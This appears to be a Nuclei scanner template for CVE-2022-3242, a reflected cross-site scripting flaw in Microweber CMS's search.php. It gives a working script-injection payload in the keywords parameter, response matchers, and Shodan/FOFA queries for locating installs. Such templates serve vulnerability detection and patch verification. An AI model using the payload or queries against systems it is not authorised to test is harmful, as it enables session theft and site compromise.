id: CVE-2022-3242

info:
  name: Microweber <1.3.2 - Cross-Site Scripting
  author: r3Y3r53
  severity: medium
  description: |
    Code Injection in on search.php?keywords= GitHub repository microweber/microweber prior to 1.3.2.
  impact: |
    Attackers can craft malicious search URLs with JavaScript in the keywords parameter that executes when users access search results, potentially stealing session cookies, admin credentials, or performing unauthorized content modifications in Microweber CMS.
  remediation: |
    Update Microweber to version 1.3.2 or later that properly sanitizes and encodes the keywords parameter in search.php.
  reference:
    - https://huntr.dev/bounties/3e6b218a-a5a6-40d9-9f7e-5ab0c6214faf/
    - https://www.tenable.com/cve/CVE-2022-3242
    - https://nvd.nist.gov/vuln/detail/CVE-2022-3242
    - https://github.com/microweber/microweber/commit/68f0721571653db865a5fa01c7986642c82e919c
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-3242
    cwe-id: CWE-79,CWE-94
    epss-score: 0.15577
    epss-percentile: 0.94467
    cpe: cpe:2.3:a:microweber:microweber:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: microweber
    product: microweber
    shodan-query:
      - http.favicon.hash:780351152
      - http.html:"microweber"
    fofa-query:
      - body="microweber"
      - icon_hash=780351152
  tags: cve,cve2022,huntr,xss,microweber,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/search.php?keywords=ABC%3Cdiv%20style=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
          - 'contains(body, "<script>alert(document.domain)</script>") && contains(tolower(body), "microweber")'
        condition: and
# digest: 490a00463044022010e21e320e12ae8b2857667831ccb4f362d5d0e4e7c2a02d55ba99c71a78431b0220265411fecdfc8d6ca910e0b847d4c7c5001345f5f62d1cd8ca81c8c1e8e35ce6:922c64590222798bb761d5b6d8e72950